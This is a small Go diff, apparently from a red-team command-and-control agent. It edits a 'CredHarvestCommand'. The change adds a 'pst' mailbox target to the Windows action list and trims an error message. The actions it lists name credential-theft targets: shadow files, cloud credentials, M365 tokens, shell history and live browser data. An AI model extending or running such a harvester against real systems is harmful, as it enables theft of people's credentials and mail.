@@ -24,9 +24,9 @@ func (c *CredHarvestCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
 		actions := "shadow, cloud, configs, history, browser-live, all"
 		if runtime.GOOS == "windows" {
-			actions = "cloud, configs, windows, m365-tokens, history, browser-live, all"
+			actions = "cloud, configs, windows, m365-tokens, history, pst, browser-live, all"
 		}
-		return errorf("Error: parameters required. Actions: %s", actions)
+		return errorf("parameters required. Actions: %s", actions)
 	}
 
 	var args credHarvestArgs
